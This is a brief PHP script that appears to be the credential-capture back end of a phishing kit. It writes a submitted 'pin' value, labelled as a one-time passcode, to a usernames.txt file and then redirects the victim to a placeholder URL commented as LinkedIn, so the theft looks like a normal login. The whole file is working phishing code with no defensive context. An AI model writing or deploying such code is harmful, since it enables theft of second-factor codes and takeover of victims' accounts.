<?php
file_put_contents("usernames.txt", "OTP: " . $_POST['pin'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://www.linkedin.com
header("Location: $url");
exit();
?>